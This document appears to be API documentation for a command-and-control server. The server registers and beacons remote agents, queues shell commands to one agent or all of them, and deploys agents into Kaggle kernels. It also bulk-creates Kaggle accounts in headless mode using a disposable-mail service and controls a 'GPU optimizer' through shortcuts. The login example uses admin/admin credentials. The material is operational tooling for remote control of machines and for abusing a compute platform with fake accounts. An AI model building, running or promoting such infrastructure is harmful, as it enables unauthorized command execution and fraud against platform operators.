# C2 Server API Documentation

**🌐 Server URL:** https://gbctwoserver.net

## Authentication

All API endpoints (except agent endpoints) require authentication via session cookie.

**Login:**
```bash
curl -X POST https://gbctwoserver.net/login \
  -d "username=admin&password=admin"
```

---

## Core Endpoints

### Health Check
```bash
GET /api/health
```
Returns server health status and metrics.

### Statistics
```bash
GET /api/stats
```
Returns agent and task statistics.

### Metrics (Prometheus)
```bash
GET /metrics
```
Returns Prometheus-formatted metrics.

---

## Agent Management

### List Agents
```bash
GET /api/agents
```

### Register Agent
```bash
POST /api/agent/register
Content-Type: application/json

{
  "id": "agent-uuid",
  "hostname": "machine-name",
  "os": "Linux",
  "arch": "x86_64",
  "ip_internal": "192.168.1.100"
}
```

### Agent Beacon
```bash
POST /api/agent/beacon
Content-Type: application/json

{
  "id": "agent-uuid"
}
```

### Submit Task Result
```bash
POST /api/agent/result
Content-Type: application/json

{
  "task_id": "task-uuid",
  "result": "command output"
}
```

---

## Task Management

### Create Task
```bash
POST /api/task/create
Content-Type: application/json

{
  "agent_id": "agent-uuid",
  "type": "cmd",
  "payload": "whoami"
}
```

### Broadcast Task
```bash
POST /api/task/broadcast
Content-Type: application/json

{
  "type": "cmd",
  "payload": "uptime",
  "target": "all"
}
```

### List Tasks
```bash
GET /api/tasks/{agent_id}
```

---

## Kaggle Integration

### List Kaggle Agents
```bash
GET /api/kaggle/agents/status
```

### Queue Command for Kaggle Agent
```bash
POST /api/kaggle/agent/queue
Content-Type: application/json

{
  "kernel_id": "kaggle-username-agent1",
  "type": "shell",
  "payload": "nvidia-smi"
}
```

### Deploy Agents to Kaggle
```bash
POST /api/kaggle/deploy/agent
Content-Type: application/json

{
  "c2_url": "https://your-server.com",
  "poll_interval": 30
}
```

### Check Deploy Progress
```bash
GET /api/kaggle/deploy/progress
```

---

## Auto-Registration

### Start Registration Job
```bash
POST /api/autoreg/start
Content-Type: application/json

{
  "platform": "kaggle",
  "count": 5,
  "mail_provider": "boomlify",
  "headless": true
}
```

### List Jobs
```bash
GET /api/autoreg/jobs
```

### List Accounts
```bash
GET /api/autoreg/accounts
```

---

## Configuration

### Get Config
```bash
GET /api/config
```

### Update Config
```bash
POST /api/config
Content-Type: application/json

{
  "public_url": "https://your-server.com",
  "agent_token": "secret-token",
  "encryption_key": "encryption-key"
}
```

---

## Shortcuts

The server supports command shortcuts for common operations:

- `:start` - Start GPU optimizer
- `:stop` - Stop GPU optimizer
- `:status` - Check optimizer status
- `:sysinfo` - System information
- `:gpu` - GPU information
- `:ps` - Process list
- `:net` - Network information

Example:
```bash
POST /api/task/create
{
  "agent_id": "agent-uuid",
  "type": "cmd",
  "payload": ":sysinfo"
}
```

---

## Export Data

### Export Agents (CSV)
```bash
GET /api/export/agents
```

### Export Logs (CSV)
```bash
GET /api/export/logs
```

### Export Tasks (CSV)
```bash
GET /api/export/tasks
```

---

## WebSocket Events

Connect to WebSocket for real-time updates:
```javascript
const socket = io('http://localhost:5000');

socket.on('agent_update', (data) => {
  console.log('Agent update:', data);
});

socket.on('task_result', (data) => {
  console.log('Task result:', data);
});

socket.on('deploy_progress', (data) => {
  console.log('Deploy progress:', data);
});
```

---

## Error Responses

All endpoints return JSON error responses:
```json
{
  "error": "error message",
  "details": "additional details"
}
```

HTTP Status Codes:
- `200` - Success
- `400` - Bad Request
- `401` - Unauthorized
- `403` - Forbidden
- `404` - Not Found
- `500` - Internal Server Error
